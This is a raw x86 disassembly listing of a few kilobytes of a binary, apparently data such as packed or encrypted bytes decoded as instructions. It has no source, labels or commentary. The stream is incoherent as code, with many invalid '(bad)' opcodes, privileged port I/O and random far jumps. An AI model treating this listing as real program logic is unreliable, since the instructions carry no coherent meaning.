  4205c4:	test   DWORD PTR [ebp-0x18d26c13],edx
  4205ca:	loopne 0x4205fa
  4205cc:	mov    eax,ds:0x2cbaa32f
  4205d1:	pop    ds
  4205d2:	ja     0x42056d
  4205d4:	outs   dx,DWORD PTR ds:[esi]
  4205d5:	mov    ds:0x6dce1345,eax
  4205da:	dec    eax
  4205db:	call   0x758ec446
  4205e0:	mov    dh,BYTE PTR [edx]
  4205e2:	add    cl,cl
  4205e4:	gs push ecx
  4205e6:	push   ebx
  4205e7:	jle    0x4205c2
  4205e9:	mov    DWORD PTR [esi-0x60],edi
  4205ec:	in     eax,dx
  4205ed:	pop    es
  4205ee:	(bad)  
  4205f0:	mov    edi,DWORD PTR [edi]
  4205f2:	xchg   ecx,eax
  4205f3:	cmp    dl,BYTE PTR [edi]
  4205f5:	mov    ds,esi
  4205f7:	xchg   ebp,eax
  4205f8:	push   edx
  4205f9:	pop    edx
  4205fa:	pop    ebx
  4205fb:	xchg   ebp,eax
  4205fc:	in     eax,0xe7
  4205fe:	out    dx,al
  4205ff:	mov    cl,0xac
  420601:	lods   eax,DWORD PTR ds:[esi]
  420602:	jbe    0x42064a
  420604:	inc    edx
  420605:	and    esi,esp
  420607:	int3   
  420608:	push   esi
  420609:	push   edi
  42060a:	dec    ebp
  42060b:	jae    0x42060a
  42060d:	dec    edi
  42060e:	adc    DWORD PTR [edi+0x0],eax
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	jno    0x42060e
  420682:	mov    esp,0x158f0ce
  420687:	add    BYTE PTR [ecx+eax*1],al
  42068a:	add    BYTE PTR [eax],al
  42068c:	jge    0x4206c8
  42068e:	add    eax,0x43fa89b1
  420693:	add    eax,0x76215839
  420698:	neg    DWORD PTR ds:0x3e73fc8d
  42069e:	popa   
  42069f:	lds    ebp,FWORD PTR ds:0x9ab2e518
  4206a5:	or     ebp,DWORD PTR [ecx]
  4206a7:	stos   DWORD PTR es:[edi],eax
  4206a8:	clc    
  4206a9:	daa    
  4206aa:	nop
  4206ab:	das    
  4206ac:	add    al,BYTE PTR [edx-0x4f]
  4206af:	iret   
  4206b0:	cld    
  4206b1:	inc    eax
  4206b2:	jae    0x42064c
  4206b4:	pop    ss
  4206b5:	inc    ecx
  4206b6:	push   0x7d
  4206b8:	iret   
  4206b9:	xor    esp,DWORD PTR [esi+0x45eac73e]
  4206bf:	into   
  4206c0:	cs push cs
  4206c2:	arpl   WORD PTR [eax+0x152ccd83],bx
  4206c8:	hlt    
  4206c9:	sbb    ax,0x7c9c
  4206cd:	mov    ah,0x9e
  4206cf:	out    0xe2,al
  4206d1:	mov    esp,0xecf7aed5
  4206d6:	les    ecx,FWORD PTR [esi+0x1156fe05]
  4206dc:	sub    dh,ah
  4206de:	icebp  
  4206df:	lods   eax,DWORD PTR es:[esi]
  4206e1:	push   0xffffffb9
  4206e3:	mov    ah,0x8d
  4206e5:	sti    
  4206e6:	into   
  4206e7:	fcomp  DWORD PTR [esi-0x4e]
  4206ea:	fsubr  st,st(6)
  4206ec:	xchg   esi,eax
  4206ed:	popa   
  4206ee:	cmp    ecx,DWORD PTR [edi-0x5a992102]
  4206f4:	fcomp  DWORD PTR [edi+0x6]
  4206f7:	xor    ecx,0xdaaa25f0
  4206fd:	fisttp DWORD PTR [esi+ecx*4]
  420700:	loope  0x420688
  420702:	rcr    DWORD PTR [ecx-0x76],cl
  420705:	xor    BYTE PTR [eax-0x26],0x73
  420709:	daa    
  42070a:	lea    edi,[esi-0x3c07f768]
  420710:	mov    eax,0x55efcea4
  420715:	clc    
  420716:	mul    DWORD PTR [eax]
  420718:	inc    esp
  420719:	mov    ds:0xdfd3f8a8,al
  42071e:	sub    BYTE PTR [edi-0x46cc45d7],dh
  420724:	xchg   esp,eax
  420725:	shrd   DWORD PTR [esi],ebx,0x17
  420729:	bound  edi,QWORD PTR [esp+esi*1]
  42072c:	or     DWORD PTR [edi+0x4],eax
  42072f:	retf   
  420730:	in     eax,0x2e
  420732:	sub    cl,BYTE PTR [esi+0xb30d305]
  420738:	adc    DWORD PTR [esi],ebx
  42073a:	popf   
  42073b:	in     eax,0x8e
  42073d:	bnd jne 0x42079b
  420740:	or     cl,BYTE PTR [ebx]
  420742:	xor    al,0xac
  420744:	rep stos DWORD PTR es:[edi],eax
  420746:	shl    DWORD PTR [edx],0xbd
  420749:	jg     0x4206d7
  42074b:	mov    esi,0x44f30817
  420750:	or     BYTE PTR [ebp+0x6b6b8ed3],bl
  420756:	jne    0x4207ac
  420758:	dec    eax
  420759:	pop    edi
  42075a:	cmp    ch,BYTE PTR [edx+esi*1-0x357c9247]
  420761:	dec    esp
  420762:	ins    DWORD PTR es:[edi],dx
  420763:	mov    edx,0x5bd411ec
  420768:	mov    BYTE PTR [edi+0x67d72ea0],ah
  42076e:	cmc    
  42076f:	sub    eax,0x7f436203
  420774:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420775:	sahf   
  420776:	mov    bh,0x79
  420778:	inc    eax
  420779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42077a:	ficomp WORD PTR [edi]
  42077c:	scas   eax,DWORD PTR es:[edi]
  42077d:	or     al,0x1e
  42077f:	pop    ds
  420780:	std    
  420781:	(bad)  
  420782:	repnz pushf 
  420784:	repz ds clc 
  420787:	scas   al,BYTE PTR es:[edi]
  420788:	lods   eax,DWORD PTR ds:[esi]
  420789:	sti    
  42078a:	fcomp  QWORD PTR [ebp-0x5a0917e9]
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	push   0xf4b26f3e
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	sub    BYTE PTR [ebx-0x70],dl
  42080f:	dec    ecx
  420810:	pushf  
  420811:	retf   
  420812:	sub    al,0xe8
  420814:	cli    
  420815:	ret    
  420816:	or     ecx,DWORD PTR [edx+0x2a]
  420819:	test   eax,0xa668483a
  42081e:	int3   
  42081f:	ds mov ecx,0x3e8e6641
  420825:	mov    dl,0x91
  420827:	or     BYTE PTR [ecx+ebp*1+0x5814fd39],dh
  42082e:	xchg   esp,eax
  42082f:	and    bh,0xb8
  420832:	addr16 mov ds:0x74ce,al
  420836:	mov    edi,DWORD PTR [edi+0xa]
  420839:	jmp    DWORD PTR [esi]
  42083b:	or     al,BYTE PTR [eax]
  42083d:	inc    ecx
  42083e:	xlat   BYTE PTR ds:[ebx]
  42083f:	sbb    eax,0xd966849d
  420844:	aaa    
  420845:	sti    
  420846:	cld    
  420847:	sbb    bh,BYTE PTR [edi+edi*4+0x50]
  42084b:	sbb    DWORD PTR [ebx],ecx
  42084d:	cmp    BYTE PTR [eax],0x43
  420850:	popf   
  420851:	mul    BYTE PTR [ecx-0x75f757ea]
  420857:	mov    ds:0xa8a83244,eax
  42085c:	inc    eax
  42085d:	mov    dh,0xd
  42085f:	fisttp DWORD PTR [eax]
  420861:	fwait
  420862:	lahf   
  420863:	or     DWORD PTR es:[eax-0x5eba3226],eax
  42086a:	sub    edi,ebx
  42086c:	popf   
  42086d:	icebp  
  42086e:	nop
  42086f:	xor    eax,0x88516f9c
  420874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420875:	mov    edx,0xddaf93a9
  42087a:	xchg   ecx,eax
  42087b:	xor    DWORD PTR [edi+0xf],ebp
  42087e:	jne    0x42081b
  420880:	ret    0x115a
  420883:	lea    ebp,[edx+0x27]
  420886:	pxor   mm3,QWORD PTR [edx-0x32]
  42088a:	dec    ecx
  42088b:	inc    esi
  42088c:	test   BYTE PTR [esi-0x60],dl
  42088f:	ins    DWORD PTR es:[edi],dx
  420890:	int    0x17
  420892:	push   es
  420893:	sahf   
  420894:	cmp    eax,0x1eadcb36
  420899:	add    al,0xb8
  42089b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089c:	or     al,0x1
  42089e:	jns    0x4208d6
  4208a0:	push   edi
  4208a1:	pop    es
  4208a2:	leave  
  4208a3:	scas   eax,DWORD PTR es:[edi]
  4208a4:	cmp    DWORD PTR [ebp*1+0x45fc0d6d],esp
  4208ab:	jmp    0x42083a
  4208ad:	xor    DWORD PTR [ecx+eiz*4-0x70],ecx
  4208b1:	jl     0x4208a7
  4208b3:	ins    BYTE PTR es:[edi],dx
  4208b4:	xor    DWORD PTR [edi-0x285e69f1],esp
  4208ba:	sbb    al,0xf4
  4208bc:	sub    bh,ah
  4208be:	lahf   
  4208bf:	mov    bh,0x9e
  4208c1:	sbb    ch,BYTE PTR [ebp-0xf13f6e6]
  4208c7:	mov    es:0xec011d60,eax
  4208cd:	mov    dh,0x4a
  4208d0:	dec    esi
  4208d1:	cmp    eax,0x181de39c
  4208d6:	and    ebx,DWORD PTR [edi-0x61]
  4208d9:	or     ecx,DWORD PTR [edi-0x598a6234]
  4208df:	(bad)  
  4208e0:	push   cs
  4208e1:	xchg   edx,eax
  4208e2:	pusha  
  4208e3:	fisubr DWORD PTR [edx]
  4208e5:	cmp    al,0xb7
  4208e7:	xchg   DWORD PTR [ebp-0x14],ecx
  4208ea:	in     al,dx
  4208eb:	push   edi
  4208ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ed:	mov    edx,0xc1462346
  4208f2:	rcl    ch,1
  4208f4:	and    BYTE PTR [ebx-0x12],cl
  4208f7:	add    DWORD PTR [ebx+0x74],eax
  4208fa:	xchg   DWORD PTR [ecx+0x48],esi
  4208fd:	mov    ah,0xb3
  4208ff:	and    esi,esp
  420901:	shl    DWORD PTR [esi+0x7e31f854],cl
  420907:	in     eax,0x21
  420909:	mov    al,0x5f
  42090b:	rcl    BYTE PTR [esi-0x3],cl
  42090e:	(bad)  
  42090f:	adc    al,BYTE PTR [eax]
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xa7
  420981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420982:	inc    esp
  420983:	ret    0x5af8
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	jle    0x4209f8
  42098e:	sbb    al,dh
  420990:	xor    eax,0xd60d6d0
  420995:	jmp    0xf679:0x9dad2a38
  42099c:	sti    
  42099d:	inc    ebp
  42099e:	add    DWORD PTR [ebx],ebx
  4209a0:	les    ebp,FWORD PTR [esi]
  4209a2:	test   DWORD PTR [esi-0x27],esp
  4209a5:	leave  
  4209a6:	pusha  
  4209a7:	adc    bl,cl
  4209a9:	shl    edi,cl
  4209ab:	adc    eax,0xd56c6aa0
  4209b0:	enter  0x1ce6,0xa8
  4209b4:	pop    ecx
  4209b5:	xlat   BYTE PTR ds:[ebx]
  4209b6:	pop    ds
  4209b7:	je     0x4209fb
  4209b9:	adc    bh,BYTE PTR ds:0x90d7de4
  4209bf:	call   0xa97ca869
  4209c4:	xchg   esp,eax
  4209c5:	sub    ebp,DWORD PTR [edi+0x4c]
  4209c8:	mov    BYTE PTR [edi-0x18180b0a],ch
  4209ce:	hlt    
  4209cf:	push   0xd
  4209d1:	and    BYTE PTR [ebx+0x52b498cc],al
  4209d7:	in     al,dx
  4209d8:	leave  
  4209d9:	sbb    esp,DWORD PTR [esi]
  4209db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209dc:	aas    
  4209dd:	jae    0x4209ec
  4209df:	aad    0x89
  4209e1:	inc    edi
  4209e2:	lock mov ds:0xc594c3f6,al
  4209e8:	dec    esi
  4209e9:	dec    ecx
  4209ea:	fmul   st,st(1)
  4209ec:	(bad)  
  4209ed:	shr    esi,cl
  4209ef:	clc    
  4209f0:	xchg   edi,eax
  4209f1:	add    ebp,esi
  4209f3:	sbb    bl,BYTE PTR [edi+edx*8+0x49dabfb9]
  4209fa:	cmp    eax,DWORD PTR [ecx+0x64]
  4209fd:	js     0x420a53
  4209ff:	mov    ds,WORD PTR [ecx+0x3d]
  420a02:	mov    al,gs:0x82272f3e
  420a08:	sub    DWORD PTR [ebx],0x5cffab58
  420a0e:	push   edx
  420a0f:	cwde   
  420a10:	fdiv   st(7),st
  420a12:	inc    esp
  420a13:	adc    BYTE PTR [edi],0xa1
  420a16:	jbe    0x420a1a
  420a18:	sub    BYTE PTR [eax-0x27],dh
  420a1b:	add    dl,bh
  420a1d:	xchg   esi,eax
  420a1e:	jne    0x420a63
  420a20:	inc    ecx
  420a21:	dec    edx
  420a22:	mov    eax,0xeafd8227
  420a27:	and    DWORD PTR [ebp+0x2049a51d],edx
  420a2d:	add    esi,DWORD PTR [edx]
  420a2f:	fcom   QWORD PTR [ecx-0x56]
  420a32:	push   esp
  420a33:	xchg   edx,eax
  420a34:	std    
  420a35:	test   eax,0xa5185ed5
  420a3a:	sub    al,0xc9
  420a3c:	pop    ecx
  420a3d:	dec    eax
  420a3e:	xchg   esi,eax
  420a3f:	xor    edx,DWORD PTR [ebp-0x40]
  420a42:	icebp  
  420a43:	pop    esp
  420a44:	dec    esp
  420a45:	fcom   st(2)
  420a47:	cld    
  420a48:	push   eax
  420a49:	shl    DWORD PTR [ebp+0x54f73790],0x8a
  420a50:	push   ebx
  420a51:	cmp    BYTE PTR [edi+edx*4+0x2d],bh
  420a55:	shl    BYTE PTR [esi+0x1b],cl
  420a58:	(bad)  
  420a59:	repnz inc esp
  420a5b:	pop    eax
  420a5c:	fld    QWORD PTR [esi+0x2e]
  420a5f:	pop    ebp
  420a60:	in     al,0xfe
  420a62:	or     BYTE PTR [edi*4-0x2ad4082b],0x99
  420a6a:	lods   al,BYTE PTR ds:[esi]
  420a6b:	popf   
  420a6c:	push   0x52
  420a6e:	test   DWORD PTR [ecx+0x51],edx
  420a71:	in     ax,dx
  420a73:	mov    ecx,0xcad61b8d
  420a78:	icebp  
  420a79:	push   edi
  420a7a:	aaa    
  420a7b:	push   ebx
  420a7c:	mov    al,0xd4
  420a7e:	loopne 0x420a14
  420a80:	cdq    
  420a81:	push   ebp
  420a82:	pushf  
  420a83:	push   edx
  420a84:	fstp   TBYTE PTR [ecx]
  420a86:	ins    BYTE PTR es:[edi],dx
  420a87:	rcr    BYTE PTR [eax],cl
  420a89:	and    eax,0xff75d4d1
  420a8e:	add    eax,DWORD PTR ds:0x0
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	xchg   ecx,eax
  420b01:	aad    0xcc
  420b03:	dec    edi
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	fstp   TBYTE PTR [ebx-0x35e44127]
  420b12:	sub    dh,BYTE PTR [ecx+0x75]
  420b15:	dec    ebx
  420b16:	xor    al,0xad
  420b18:	cmp    dh,al
  420b1a:	xchg   ecx,eax
  420b1b:	adc    ebp,esi
  420b1d:	neg    DWORD PTR [edi+ebp*2+0x63441465]
  420b24:	repnz dec esi
  420b26:	test   DWORD PTR [esi-0x75],eax
  420b29:	jbe    0x420aea
  420b2b:	sub    ch,0xf4
  420b2e:	xor    DWORD PTR [ecx+0x67054638],ebx
  420b34:	shr    BYTE PTR [esi-0x5cb3c358],cl
  420b3a:	pop    ecx
  420b3b:	add    eax,0x96406693
  420b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b41:	and    eax,0x32f90ab2
  420b46:	(bad)  
  420b47:	std    
  420b48:	pushf  
  420b49:	stc    
  420b4a:	outs   dx,BYTE PTR ds:[esi]
  420b4b:	adc    BYTE PTR [eax+0x626d0cdd],ch
  420b51:	imul   DWORD PTR [edx]
  420b53:	mov    bl,0xb1
  420b55:	stos   DWORD PTR es:[edi],eax
  420b56:	pop    es
  420b57:	stos   BYTE PTR es:[edi],al
  420b58:	and    al,0xa1
  420b5a:	ror    BYTE PTR [esi],cl
  420b5c:	push   ecx
  420b5e:	ins    BYTE PTR es:[edi],dx
  420b5f:	nop
  420b60:	push   edx
  420b61:	mov    ebp,0xde22650c
  420b66:	mul    BYTE PTR [ecx-0x161b43e5]
  420b6c:	sub    BYTE PTR [esi],0xe5
  420b6f:	xor    BYTE PTR [ebx-0x7ebee592],dl
  420b75:	lea    eax,[ebx+0x59]
  420b78:	and    eax,0xc9cde1a0
  420b7d:	std    
  420b7e:	scas   eax,DWORD PTR es:[edi]
  420b7f:	lods   al,BYTE PTR ds:[esi]
  420b80:	mov    WORD PTR [ebp-0x2b66d3f2],?
  420b86:	dec    esi
  420b87:	out    0x47,al
  420b89:	mov    cs,WORD PTR [edx-0x388b52c7]
  420b8f:	icebp  
  420b90:	(bad)  
  420b91:	sbb    BYTE PTR [edx],dl
  420b93:	dec    edx
  420b94:	iret   
  420b95:	test   eax,0x185f8d02
  420b9a:	xor    BYTE PTR [ebp-0x65],dh
  420b9d:	psllq  mm5,QWORD PTR [esi+0x1d]
  420ba1:	xor    DWORD PTR ss:[ebp+0x2ef00adb],eax
  420ba8:	ror    DWORD PTR [eax-0x6c97ee6e],cl
  420bae:	adc    DWORD PTR [eax-0x6629f11a],ebx
  420bb4:	adc    cl,BYTE PTR [edx]
  420bb6:	mov    dh,0x39
  420bb8:	jl     0x420b40
  420bba:	push   ecx
  420bbb:	xor    BYTE PTR [edi],ch
  420bbd:	pop    edi
  420bbe:	and    esi,DWORD PTR [edx+0x609d49d]
  420bc4:	or     BYTE PTR [edx+eax*2-0x29b5ed8c],al
  420bcb:	scas   eax,DWORD PTR es:[edi]
  420bcc:	fsubr  DWORD PTR [edx+ebp*1]
  420bcf:	bound  esi,QWORD PTR [edx]
  420bd1:	sti    
  420bd2:	loop   0x420ba9
  420bd4:	push   ebp
  420bd5:	div    DWORD PTR [eax-0x62]
  420bd8:	inc    eax
  420bd9:	fwait
  420bda:	sub    BYTE PTR [ecx-0x7f],al
  420bdd:	es push ecx
  420bdf:	mov    eax,DWORD PTR [ebp-0x11]
  420be2:	mov    ds:0x26d199c4,eax
  420be7:	mov    al,bl
  420be9:	push   esp
  420bea:	mov    BYTE PTR [ebp+0x70710c3f],bh
  420bf0:	jnp    0x420c35
  420bf2:	push   es
  420bf3:	outs   dx,BYTE PTR ds:[esi]
  420bf4:	ror    BYTE PTR [ebp-0x6d],cl
  420bf7:	imul   edx,DWORD PTR [eax+0x36],0x6f
  420bfb:	scas   al,BYTE PTR es:[edi]
  420bfc:	outs   dx,DWORD PTR ds:[esi]
  420bfd:	out    0x7c,al
  420bff:	out    dx,al
  420c00:	add    DWORD PTR [ecx],ebx
  420c02:	mov    edx,0xaf5e5598
  420c07:	mov    eax,0x255d337e
  420c0c:	inc    edi
  420c0d:	xchg   ebp,eax
  420c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c0f:	pop    ds
	...
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0xbf
  420c81:	inc    eax
  420c82:	(bad)  
  420c83:	sbb    eax,0x15d00
  420c88:	add    al,0x1
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	data16 xlat BYTE PTR ds:[ebx]
  420c8e:	jnp    0x420c39
  420c90:	xor    BYTE PTR [esi+eiz*1],0x44
  420c94:	jbe    0x420c2f
  420c96:	lea    esp,[ebx]
  420c98:	xchg   esi,eax
  420c99:	pop    ebx
  420c9a:	syscall 
  420c9c:	cld    
  420c9d:	jne    0x420c65
  420c9f:	adc    dh,ah
  420ca1:	adc    BYTE PTR [ebx+0x3],cl
  420ca4:	pop    eax
  420ca5:	pop    esi
  420ca6:	and    DWORD PTR [eax+0x5c3182a6],edx
  420cac:	add    BYTE PTR [edi-0x490b2bed],0xb3
  420cb3:	inc    esp
  420cb4:	out    0x8,eax
  420cb6:	clc    
  420cb7:	cmp    BYTE PTR [esi],bl
  420cb9:	fst    DWORD PTR [edx]
  420cbb:	mov    eax,0xc1129b64
  420cc0:	shr    DWORD PTR [ebp+0x224ab955],cl
  420cc6:	int    0x6f
  420cc8:	inc    ebp
  420cc9:	popf   
  420cca:	(bad)  
  420ccb:	call   0xf5b7e1cd
  420cd0:	rcl    bl,0x5e
  420cd3:	adc    ch,BYTE PTR [esi]
  420cd5:	or     DWORD PTR [ebp-0x5],esp
  420cd8:	sub    bl,bl
  420cda:	sub    DWORD PTR [esi+0x66b677fd],0x722fed4c
  420ce4:	xchg   ebp,eax
  420ce5:	sbb    ecx,esi
  420ce7:	(bad)  
  420ce8:	adc    eax,0xc01464b4
  420ced:	mov    ds:0x8e1df89c,al
  420cf2:	std    
  420cf3:	or     al,0xc7
  420cf5:	xchg   ebx,eax
  420cf6:	xchg   ebp,eax
  420cf7:	loopne 0x420cb0
  420cf9:	xchg   esi,eax
  420cfa:	mov    dl,BYTE PTR ds:0x7577f06
  420d00:	rcl    BYTE PTR [ebx+0x48],cl
  420d03:	daa    
  420d04:	mov    ds:0x38a788a3,eax
  420d09:	je     0x420d80
  420d0b:	or     al,0x50
  420d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d0e:	stos   DWORD PTR es:[edi],eax
  420d0f:	xchg   DWORD PTR [edi-0x72],ebx
  420d12:	jl     0x420d22
  420d14:	mov    eax,ds:0xad5c5aee
  420d19:	jmp    0x420d57
  420d1b:	dec    esi
  420d1c:	sbb    ah,0x61
  420d1f:	fnstsw WORD PTR [edx]
  420d21:	inc    ebp
  420d22:	sbb    ah,ah
  420d24:	xchg   esi,eax
  420d25:	push   ebp
  420d26:	add    BYTE PTR [edi+0x13],ch
  420d29:	scas   eax,DWORD PTR es:[edi]
  420d2a:	pop    edi
  420d2b:	sbb    dl,ah
  420d2d:	iret   
  420d2e:	pop    ss
  420d2f:	stos   BYTE PTR es:[edi],al
  420d30:	es dec esp
  420d32:	icebp  
  420d33:	in     al,dx
  420d34:	inc    eax
  420d35:	daa    
  420d36:	cmp    BYTE PTR [ecx+eax*1],bl
  420d39:	out    0xa8,eax
  420d3b:	fisubr DWORD PTR [edi+0x46]
  420d3e:	push   edi
  420d3f:	mov    ebx,0x97cc755c
  420d44:	push   ecx
  420d45:	dec    BYTE PTR [esi]
  420d47:	in     eax,0x2b
  420d49:	ret    
  420d4a:	sub    dh,dh
  420d4c:	fistp  QWORD PTR [esi-0x3ec1dcea]
  420d52:	or     ebp,ecx
  420d54:	adc    DWORD PTR [ebx],edi
  420d56:	nop
  420d57:	xchg   edi,eax
  420d58:	mov    bh,BYTE PTR [edx+0xc65f7af]
  420d5e:	in     al,dx
  420d5f:	mov    al,ds:0xf8d2351a
  420d64:	test   eax,0xf6fabf87
  420d69:	push   0x2ce03d19
  420d6e:	jnp    0x420d0c
  420d70:	iret   
  420d71:	test   al,0x71
  420d73:	adc    DWORD PTR [edx],esi
  420d75:	data16 fs popfw 
  420d79:	sub    eax,0xb879bd4a
  420d7e:	cli    
  420d7f:	shrd   DWORD PTR [esi+0x55c6b20c],ebx,cl
  420d86:	arpl   WORD PTR [ebp-0x37c9f909],ax
  420d8c:	pop    es
  420d8d:	mov    bh,0x72
  420d8f:	mov    al,BYTE PTR [eax]
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x82aec840
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	hlt    
  420e0d:	dec    esi
  420e0e:	mov    eax,DWORD PTR [esi]
  420e10:	add    ebp,edi
  420e12:	adc    BYTE PTR [ebp-0x39],ah
  420e15:	jl     0x420dd7
  420e17:	push   eax
  420e18:	or     bh,BYTE PTR [esi]
  420e1a:	rcl    BYTE PTR [ebx],cl
  420e1c:	ds inc ecx
  420e1e:	mov    edx,DWORD PTR [esi+0x292ba23]
  420e24:	fwait
  420e25:	sub    esp,ecx
  420e27:	jnp    0x420daa
  420e29:	pop    ecx
  420e2a:	sub    bh,cl
  420e2c:	bsr    edi,ebx
  420e2f:	xor    ebx,DWORD PTR [ebx]
  420e31:	dec    ebp
  420e32:	sub    bl,BYTE PTR [ebx]
  420e34:	aaa    
  420e35:	mov    DWORD PTR [ebx+0x66],ebx
  420e38:	mov    cl,0x88
  420e3a:	inc    eax
  420e3b:	xor    ch,BYTE PTR [edx]
  420e3d:	js     0x420e4a
  420e3f:	sbb    BYTE PTR ss:[ecx-0x4c],ah
  420e43:	out    0xec,al
  420e45:	aaa    
  420e46:	daa    
  420e47:	xor    dh,BYTE PTR [edi-0x30c130a6]
  420e4d:	ror    DWORD PTR [eax-0x4411f905],0x2a
  420e54:	mov    ds:0x301cfcbd,eax
  420e59:	in     al,0x59
  420e5b:	lods   eax,DWORD PTR ds:[esi]
  420e5c:	pop    eax
  420e5d:	or     ah,BYTE PTR ds:0x1a0c30ed
  420e63:	data16 js 0x420ea0
  420e66:	clc    
  420e67:	retf   
  420e68:	mov    ds:0x4f03e873,eax
  420e6d:	fstp   DWORD PTR [ecx]
  420e6f:	cli    
  420e70:	cmp    ebp,ecx
  420e72:	sub    eax,0xd785cefd
  420e77:	cmp    eax,DWORD PTR [edx]
  420e79:	cld    
  420e7a:	push   cs
  420e7b:	adc    edx,DWORD PTR [edi+0x58]
  420e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e7f:	sbb    eax,0x331fcb74
  420e84:	(bad)
  420e89:	pusha  
  420e8a:	inc    eax
  420e8b:	inc    edi
  420e8c:	idiv   BYTE PTR [ebp+0x17c6c76b]
  420e92:	sub    DWORD PTR [eax-0x6e],edx
  420e95:	mov    esp,0x5b4fb709
  420e9a:	ficomp WORD PTR [ecx+0x43d336b5]
  420ea0:	push   eax
  420ea1:	ja     0x420e35
  420ea3:	dec    ecx
  420ea4:	sub    ch,BYTE PTR [ebp-0x29]
  420ea7:	scas   al,BYTE PTR es:[edi]
  420ea8:	je     0x420eda
  420eaa:	or     cl,dh
  420eac:	ja     0x420eed
  420eae:	sub    dl,bh
  420eb0:	mov    ch,0xf3
  420eb2:	add    BYTE PTR [edi+0x7efea8fa],0x32
  420eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eba:	test   eax,0xc4600b62
  420ebf:	cmp    esi,DWORD PTR [ecx-0x54]
  420ec2:	add    dh,ah
  420ec4:	jmp    0xf9a9715b
  420ec9:	pop    esp
  420eca:	test   esi,0x2bb7daf
  420ed0:	test   BYTE PTR ds:0xf73b8867,bh
  420ed6:	and    BYTE PTR [esi+0x5a865daa],ch
  420edc:	sbb    ecx,DWORD PTR [edx]
  420ede:	mov    esp,0xc33b421e
  420ee3:	stc    
  420ee4:	out    0xdd,al
  420ee6:	jno    0x420ecf
  420ee8:	test   DWORD PTR [ebx+0x2b],edx
  420eeb:	jns    0x420ec6
  420eed:	iret   
  420eee:	mov    ds:0x4cd1af94,eax
  420ef3:	mov    ds:0x690deae2,eax
  420ef8:	cld    
  420ef9:	or     al,0xb1
  420efb:	loopne 0x420f59
  420efd:	mov    al,0x7
  420eff:	push   ecx
  420f00:	jmp    0xa8b7:0xb4ac68d3
  420f07:	lods   eax,DWORD PTR ds:[esi]
  420f08:	xor    BYTE PTR [eax],0xc3
  420f0b:	retf   
  420f0c:	cmp    BYTE PTR [eax+0x86ff],bl
	...
  420f72:	add    BYTE PTR [eax],al
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x234da7ab]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	sub    BYTE PTR gs:[ebx+0x5a],bl
  420f90:	and    DWORD PTR [edi-0xb5a9503],edi
  420f96:	loope  0x420fc0
  420f98:	or     eax,0x69eaf6ea
  420f9d:	sub    eax,0x6d5063e3
  420fa2:	rcr    BYTE PTR [edx+0x1a763d4],0xca
  420fa9:	adc    ecx,0xc2a3ad08
  420faf:	leave  
  420fb0:	lahf   
  420fb1:	adc    al,0x46
  420fb3:	push   es
  420fb4:	icebp  
  420fb5:	jg     0x420f90
  420fb7:	cmp    ebp,DWORD PTR [esi-0x57]
  420fba:	jns    0x421026
  420fbc:	retf   0x17bf
  420fbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fc0:	xchg   ebp,eax
  420fc1:	xchg   BYTE PTR [esi],dh
  420fc3:	out    dx,eax
  420fc4:	jmp    0x65cd:0xa2770717
  420fcb:	enter  0xba97,0xf7
  420fcf:	sbb    al,0x45
  420fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd2:	add    bl,ah
  420fd4:	repz adc DWORD PTR [edi],esi
  420fd7:	lea    ebx,[eax-0x1415b29f]
  420fdd:	icebp  
  420fde:	clc    
